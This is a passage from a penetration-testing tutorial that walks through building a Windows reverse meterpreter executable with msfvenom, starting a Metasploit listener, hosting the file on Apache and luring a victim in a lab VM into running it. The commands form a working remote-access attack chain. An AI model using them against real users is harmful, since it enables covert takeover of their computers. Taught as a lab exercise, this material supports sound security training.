    # Creating a reverse shell with Metasploit and capturing its connections


    When we do a client side attack, we have the ability to trick the user into executing
    programs and make those programs connect back to a controlling computer.


    In this recipe, we will learn how to use Metasploit''s `msfvenom` to create an
    executable program (reverse meterpreter shell) that will connect to our Kali computer,
    when executed, and give us the control of the user''s computer.


    ## How to do it...


    1. First, we will create our shell. Open a terminal in Kali and issue the following
    command:


    ```

    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4443 -f exe
    > cute_dolphin.exe

    ```


    237


    ![](index-256_1.png)


    [Technet24.ir](http://technet24.ir)


    *Client-Side Attacks and Social Engineering*


    This will create a file named `cute_dolphin.exe`, which is a reverse meterpreter
    shell; reverse means that it will connect back to us instead of listening for
    us to connect.


    2. Next, we need to set up a listener for the connection our cute dolphin is going
    to create, in the `msfconsole`''s terminal:


    ```

    use exploit/multi/handler

    set payload windows/meterpreter/reverse_tcp

    set lhost 192.168.56.1

    set lport 4443

    set ExitOnSession false

    set AutorunScript post/windows/manage/smart_migrate

    exploit -j -z

    ```


    As you can see, the `LHOST` and `LPORT` are the ones we used to create the `.exe`
    file. This is the IP address and TCP port the program is going to connect to,
    so we will need to listen on that network interface of our Kali Linux and over
    that port.


    3. Now, we have our Kali ready, it''s time to prepare the attack on the user.
    Let''s start the Apache service as root and run the following code:


    ```

    service apache2 start

    ```


    4. Then, copy the malicious file to the web server folder:


    ```

    cp cute_dolphin.exe /var/www/html/

    ```


    5. Suppose we use social engineering and make our victim believe that the file
    is something they should run to obtain some benefit. In the windows-client virtual
    machine, go to `http://192.168.56.1/cute_dolphin.exe`.


    6. You will be asked to download or run the file, for testing purposes, select
    `Run`, and when asked, `Run` again.


    7. Now, in the Kali''s `msfconsole` terminal, you should see the connection getting
    established:


